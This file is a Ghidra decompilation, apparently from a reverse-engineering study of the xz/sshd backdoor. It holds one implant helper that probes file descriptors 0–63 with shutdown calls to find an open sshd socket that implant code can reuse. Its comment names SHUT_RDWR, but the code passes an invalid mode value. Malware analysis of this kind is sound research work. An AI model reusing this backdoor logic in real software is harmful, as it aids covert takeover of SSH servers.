// /home/kali/xzre-ghidra/xzregh/107BC0_sshd_get_usable_socket.c
// Function: sshd_get_usable_socket @ 0x107BC0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_usable_socket(int * pSock, int socket_index, libc_imports_t * imports)


/*
 * AutoDoc: Runs a brute-force probe across file descriptors 0–63, calling `shutdown(fd, SHUT_RDWR)` on each one and treating
 * `EINVAL`/`ENOTCONN` (or a non-zero return) as evidence that the descriptor is open but idle. Every candidate bumps a
 * counter, and when the counter reaches the requested `socket_index` the fd is returned to the caller so implants can
 * recycle sshd's sockets even when the monitor struct is missing.
 */

#include "xzre_types.h"

BOOL sshd_get_usable_socket(int *pSock,int socket_index,libc_imports_t *imports)

{
  int iVar1;
  int *piVar2;
  int sockfd_00;
  int iVar3;
  int shutdown_result;
  int *errno_ptr;
  int sockfd;
  
  if (pSock == (int *)0x0) {
    return FALSE;
  }
  if (imports != (libc_imports_t *)0x0) {
    iVar3 = -1;
    sockfd_00 = 0;
    do {
      sockfd = 0;
      if ((imports->shutdown != (pfn_shutdown_t)0x0) &&
         (imports->__errno_location != (pfn___errno_location_t)0x0)) {
        iVar1 = (*imports->shutdown)(sockfd_00,0x7fffffff);
        if (iVar1 < 0) {
          piVar2 = (*imports->__errno_location)();
LAB_00107c21:
          if ((*piVar2 != 0x16) && (*piVar2 != 0x6b)) goto LAB_00107c40;
        }
        else {
          piVar2 = &sockfd;
          if (iVar1 != 0) goto LAB_00107c21;
        }
        iVar3 = iVar3 + 1;
        if (iVar3 == socket_index) {
          *pSock = sockfd_00;
          return TRUE;
        }
      }
LAB_00107c40:
      sockfd_00 = sockfd_00 + 1;
    } while (sockfd_00 != 0x40);
  }
  return FALSE;
}

